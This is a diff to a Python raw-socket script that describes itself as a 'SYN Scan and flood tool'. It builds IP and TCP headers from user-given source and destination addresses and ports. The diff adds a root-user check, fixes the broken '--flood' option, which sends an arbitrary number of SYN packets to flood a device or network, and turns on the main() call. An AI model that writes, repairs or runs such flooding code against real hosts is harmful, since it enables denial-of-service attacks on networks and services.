@@ -1,6 +1,5 @@
-
 #!/usr/bin/python
-
+import os
 import socket
 import sys
 from struct import *
@@ -32,6 +31,7 @@ def ipCreate(source_ip, dest_ip):
 	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 	s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 	packet = ''
+#	packet = None
 
 	# IP header fields
 	ihl = 5
@@ -99,7 +99,18 @@ def tcpCreate(source_ip ,dest_ip, source_port, dest_port):
 	tcp_header = pack('!HHLLBBHHH', source_port, dest_port, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_ptr)
 	return tcp_header
 
+# CHECK LOCAL UID AND PROVIDE RESTRICTION BANNER
+def permissions():
+	checkPerms = os.getuid()
+	if checkPerms != 0:
+		print("The logged in user is not root")
+		sys.exit(0)
+	else:
+		return 0
+	return checkPerms
+
 def main():
+	print("Logged in user is {}".format(permissions()))
 	s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 	createSock(s)
 	parser = argparse.ArgumentParser(description='SYN Scan and flood tool which forms raw packets taking required IP addresses and port numbers')
@@ -107,12 +118,13 @@ def main():
         parser.add_argument("dip", help='Destination IP address to form packet', type=str)
 	parser.add_argument("sport", help='Source port to form packet', type=int)
 	parser.add_argument("dport", help='Destination port to form packet', type=int)
-	parser.add_argument("-f" "--flood", help="SYN Flood option to send arbituary number of packets to flood device or network", type=int)
+	parser.add_argument("-f", "--flood", help="SYN Flood option to send arbituary number of packets to flood device or network", type=int)
         args = parser.parse_args()
 
 	ip_header = ipCreate(args.sip, args.dip)
 	tcp_header = tcpCreate(args.sip, args.dip, args.sport, args.dport)
 	packet = ip_header + tcp_header
+	print(args)
 	if args.flood:
 		i = 0
 		value = int(args.flood)
@@ -125,4 +137,4 @@ def main():
 		result = s.sendto(packet, (args.dip, 0))
 
 	# TO TEST THIS PROGRAM LAUNCH IN PYTHON AND OPEN WIRESHARK ON THE SPECIFIED NETWORK INTERFACE
-#main()
+main()
